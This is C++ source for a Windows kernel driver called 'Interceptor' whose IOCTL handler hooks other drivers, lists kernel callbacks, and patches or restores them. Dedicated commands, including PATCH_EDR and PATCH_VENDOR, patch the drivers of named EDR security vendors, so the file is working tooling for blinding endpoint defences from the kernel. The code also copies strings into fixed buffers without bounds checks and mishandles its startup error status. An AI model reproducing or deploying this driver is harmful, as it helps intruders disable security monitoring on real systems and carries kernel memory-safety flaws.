#include "pch.h"
#include "Interceptor.h"

//globals
WINDOWS_INDEX g_WindowsIndex;

extern "C" NTSTATUS
DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);

	DriverObject->DriverUnload = InterceptUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] =  InterceptCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = InterceptDeviceControl;

	UNICODE_STRING devName, symLink;
	devName = RTL_CONSTANT_STRING(L"\\Device\\Interceptor");
	symLink = RTL_CONSTANT_STRING(L"\\??\\Interceptor");

	PDEVICE_OBJECT DeviceObject = nullptr;
	auto status = STATUS_SUCCESS;
	auto symLinkCreated = false;

	do {
		status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
		if (!NT_SUCCESS(status)) {
			KdPrint((DRIVER_PREFIX "failed to create device (0x%08X\n", status));
			break;
		}

		DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

		status = IoCreateSymbolicLink(&symLink, &devName);
		if (!NT_SUCCESS(status)) {
			KdPrint((DRIVER_PREFIX "failed to create symbolic link (0x%08X)\n", status));
			break;
		}
		symLinkCreated = true;

	} while (false);

	if (!NT_SUCCESS(status)) {
		if (symLinkCreated)
			IoDeleteSymbolicLink(&symLink);
		if (DeviceObject)
			IoDeleteDevice(DeviceObject);
	}

	g_WindowsIndex = GetWindowsIndex();
	status = AuxKlibInitialize();
	KdPrint((DRIVER_PREFIX "successfully initialized\n"));

	return status;
}

NTSTATUS CompleteRequest(PIRP Irp, NTSTATUS status, ULONG_PTR information) {
	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = information;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS InterceptCreateClose(PDEVICE_OBJECT, PIRP Irp) {
	return CompleteRequest(Irp, STATUS_SUCCESS, 0);
}

void InterceptUnload(PDRIVER_OBJECT DriverObject) {
	UnhookAllDrivers();
	RestoreAllCallbacks();
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Interceptor");
	IoDeleteSymbolicLink(&symLink);
	IoDeleteDevice(DriverObject->DeviceObject);
	KdPrint((DRIVER_PREFIX "successfully unloaded\n"));
}

NTSTATUS InterceptDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	auto code = stack->Parameters.DeviceIoControl.IoControlCode;
	auto status = STATUS_INVALID_DEVICE_REQUEST;
	ULONG_PTR information = 0;

	switch (code) {
		case IOCTL_INTERCEPTOR_LIST_DRIVERS: {
			PVOID bufferOut = Irp->UserBuffer;
			size_t szBufferOut = stack->Parameters.DeviceIoControl.OutputBufferLength;
			INTERCEPTOR_BUFFER kOutputBuffer = { &szBufferOut, (PWSTR*)&bufferOut };

			status = ListDrivers(&kOutputBuffer);
			if (NT_SUCCESS(status)) {
				information = stack->Parameters.DeviceIoControl.OutputBufferLength - szBufferOut;
			}
			break;
		}
		case IOCTL_INTERCEPTOR_LIST_HOOKED_DRIVERS: {
			PVOID bufferOut = Irp->UserBuffer;
			size_t szBufferOut = stack->Parameters.DeviceIoControl.OutputBufferLength;
			INTERCEPTOR_BUFFER kOutputBuffer = { &szBufferOut, (PWSTR*)&bufferOut };

			kwriteout(&kOutputBuffer, L"[*] Hooked drivers:\n");
			int j = 0;
			for (int i = 0; i < MaxIntercept; i++) {
				if (g_InterceptGlobals.Drivers[i].DriverObject != nullptr) {
					j++;
					status = kwriteout(&kOutputBuffer, L"[%02d] %ws\n", i, g_InterceptGlobals.Drivers[i].DriverName);
					if (!NT_SUCCESS(status))
						return status;
				}
			}

			if (j == 0)
				status = kwriteout(&kOutputBuffer, L"[-] No hooked drivers\n");

			if (NT_SUCCESS(status)) {
				information = stack->Parameters.DeviceIoControl.OutputBufferLength - szBufferOut;
			}
			break;
		}
		case IOCTL_INTERCEPTOR_HOOK_DRIVER: {
			auto data = (USER_DRIVER_DATA*)Irp->AssociatedIrp.SystemBuffer;
			if (data == nullptr) {
				status = STATUS_INVALID_PARAMETER;
				break;
			}

			CHAR dName[256];
			PCHAR driverName = dName;
			GetDriverName(data->index, driverName);
			KdPrint((DRIVER_PREFIX "raw driver name: %s\n", driverName));

			wchar_t wDriverName[256];
			mbstowcs(wDriverName, driverName, 256);
			KdPrint((DRIVER_PREFIX "conversion: %ws\n", wDriverName));

			wchar_t prefix[256] = L"\\Driver\\";
			wchar_t wDriverPath[256] = L"";
			wcscat(wDriverPath, prefix);
			wcscat(wDriverPath, wDriverName);

			wDriverPath[wcslen(wDriverPath) - 4] = '\0';

			KdPrint((DRIVER_PREFIX "final path: %ws\n", wDriverPath));

			status = HookDriver(wDriverPath);
			if (NT_SUCCESS(status)) {
				information = sizeof(PVOID);
			}
			
			break;
		}
		case IOCTL_INTERCEPTOR_HOOK_DRIVER_BY_NAME: {
			auto data = (USER_DRIVER_DATA*)Irp->AssociatedIrp.SystemBuffer;
			if (data == nullptr) {
				status = STATUS_INVALID_PARAMETER;
				break;
			}

			status = HookDriver(data->name);
			if (NT_SUCCESS(status)) {
				information = sizeof(PVOID);
			}

			break;
		}
		case IOCTL_INTERCEPTOR_UNHOOK_DRIVER: {
			auto data = (USER_DRIVER_DATA*)Irp->AssociatedIrp.SystemBuffer;
			if (data == nullptr) {
				status = STATUS_INVALID_PARAMETER;
				break;
			}

			status = UnhookDriver(data->index);

			break;
		}
		case IOCTL_INTERCEPTOR_UNHOOK_ALL_DRIVERS: {
			status = UnhookAllDrivers();
			break;
		}	
		case IOCTL_INTERCEPTOR_LIST_CALLBACKS: {
			PVOID bufferOut = Irp->UserBuffer;
			size_t szBufferOut = stack->Parameters.DeviceIoControl.OutputBufferLength;
			INTERCEPTOR_BUFFER kOutputBuffer = { &szBufferOut, (PWSTR*)&bufferOut };

			status = ReadCallbacks(&kOutputBuffer);
			if (NT_SUCCESS(status)) {
				information = stack->Parameters.DeviceIoControl.OutputBufferLength - szBufferOut;
			}
			break;
		}
		case IOCTL_INTERCEPTOR_PATCH_EDR: {
			for (int i = 0; i < EDR_DRIVER_COUNT; i++) {
				PatchModule((PCHAR)g_EDRDriverData.EDR[i].name);
			}
			status = STATUS_SUCCESS;
			break;
		}
		case IOCTL_INTERCEPTOR_PATCH_VENDOR: {
			auto data = (USER_CALLBACK_DATA*)Irp->AssociatedIrp.SystemBuffer;
			if (data == nullptr) {
				status = STATUS_INVALID_PARAMETER;
				break;
			}
			for (int i = 0; i < EDR_DRIVER_COUNT; i++) {
				if (wcscmp(data->vendor, g_EDRDriverData.EDR[i].vendor) == 0) {
					PatchModule((PCHAR)g_EDRDriverData.EDR[i].name);
				}
			}
			status = STATUS_SUCCESS;
			break;
		}
		case IOCTL_INTERCEPTOR_RESTORE_VENDOR: {
			auto data = (USER_CALLBACK_DATA*)Irp->AssociatedIrp.SystemBuffer;
			if (data == nullptr) {
				status = STATUS_INVALID_PARAMETER;
				break;
			}
			for (int i = 0; i < EDR_DRIVER_COUNT; i++) {
				if (wcscmp(data->vendor, g_EDRDriverData.EDR[i].vendor) == 0) {
					RestoreModule((PCHAR)g_EDRDriverData.EDR[i].name);
				}
			}
			status = STATUS_SUCCESS;
			break;
		}
		case IOCTL_INTERCEPTOR_PATCH_MODULE: {
			auto data = (USER_CALLBACK_DATA*)Irp->AssociatedIrp.SystemBuffer;
			if (data == nullptr) {
				status = STATUS_INVALID_PARAMETER;
				break;
			}
			status = PatchModule(data->module);
			break;
		}
		case IOCTL_INTERCEPTOR_RESTORE_MODULE: {
			auto data = (USER_CALLBACK_DATA*)Irp->AssociatedIrp.SystemBuffer;
			if (data == nullptr) {
				status = STATUS_INVALID_PARAMETER;
				break;
			}
			status = RestoreModule(data->module);
			break;
		}
		case IOCTL_INTERCEPTOR_PATCH_CALLBACK: {
			auto data = (USER_CALLBACK_DATA*)Irp->AssociatedIrp.SystemBuffer;
			if (data == nullptr) {
				status = STATUS_INVALID_PARAMETER;
				break;
			}

			status = PatchCallback((ULONG64)data->index, data->callback);
			break;
		}
		case IOCTL_INTERCEPTOR_RESTORE_CALLBACK: {
			auto data = (USER_CALLBACK_DATA*)Irp->AssociatedIrp.SystemBuffer;
			if (data == nullptr) {
				status = STATUS_INVALID_PARAMETER;
				break;
			}

			status = RestoreCallback((ULONG64)data->index, data->callback);
			break;
		}
		case IOCTL_INTERCEPTOR_RESTORE_ALL_CALLBACKS: {
			status = RestoreAllCallbacks();
			break;
		}
	}

	return CompleteRequest(Irp, status, information);
}

WINDOWS_INDEX GetWindowsIndex() {
	NTSTATUS status = STATUS_SUCCESS;
	OSVERSIONINFOEXW osVersionInfo;
	osVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
	status = RtlGetVersion((POSVERSIONINFOW)&osVersionInfo);

	switch (osVersionInfo.dwBuildNumber)
	{
	case 2600:
	case 3790:
	case 6000:
	case 6001:
	case 6002:
	case 8102:
	case 8250:
	case 9200:
	case 9431:
	case 9600:
		return WindowsIndexUNSUPPORTED;
		break;
	case 7600:
	case 7601:
		return WindowsIndexWIN7;
		break;
	case 10240:
	case 10586:
	case 14393:
	case 15063:
	case 16299:
	case 17134:
	case 17763:
		return WindowsIndexWIN10_18;
		break;
	case 18362:
	case 18363:
	case 19041:
	case 19042:
	case 19043:
		return WindowsIndexWIN10_19;
		break;
	case 21996:
	case 22000:
		return WindowsIndexWIN11;
		break;
	default:
		return WindowsIndexWIN11;
	}
}